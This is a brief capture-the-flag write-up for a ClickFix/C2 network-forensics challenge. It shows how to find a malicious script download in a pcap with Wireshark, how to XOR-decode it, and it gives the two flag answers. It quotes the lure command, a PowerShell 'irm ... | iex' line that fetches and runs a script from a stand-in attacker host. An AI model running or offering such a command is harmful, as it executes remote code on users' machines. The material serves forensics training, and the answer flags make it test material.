This is a CTF challenge made to replicate what happens during a clickfix/C2 attack 

ClickFix 1: The Download

A user followed a fake troubleshooting prompt and was told to run:

powershell.exe -NoLogo -NoProfile -Command "irm 'http://evil-clickfix.com/stage.ps1' | iex"

Using the supplied challenge.pcap, investigate the script download and

<img width="959" height="86" alt="image" src="https://github.com/user-attachments/assets/f277fef8-0032-4d53-8732-6efcefbc3c45" />
here you get the right packet by searching for http.host contains "evil-clickfix" because the shell command run is to extract from the website called evil-clickfix.com
if you then follow the http stream you will get this up 
<img width="518" height="231" alt="image" src="https://github.com/user-attachments/assets/dbafa16a-e247-4826-9487-8bfaa38d8d48" />
here you can find the first flag written backwards which says CTFkom{w1r3sh4rk}

use a script that decodes the xor 
<img width="509" height="358" alt="image" src="https://github.com/user-attachments/assets/3ebea00c-d53a-4717-862f-44d6f29bc384" />
where you then get the flag CTFkom{p0st_x0r}







